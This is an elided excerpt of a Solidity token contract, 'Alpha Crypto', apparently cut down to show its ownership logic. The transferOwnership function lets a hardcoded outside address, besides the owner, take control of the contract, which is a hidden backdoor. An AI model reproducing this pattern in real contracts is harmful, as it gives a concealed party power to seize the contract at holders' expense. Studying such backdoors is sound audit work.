...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xdaC4c376A151E28C8caDfD246cDACA26c99c006F));
...
contract AlphaCrypto is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "Alpha Crypto";
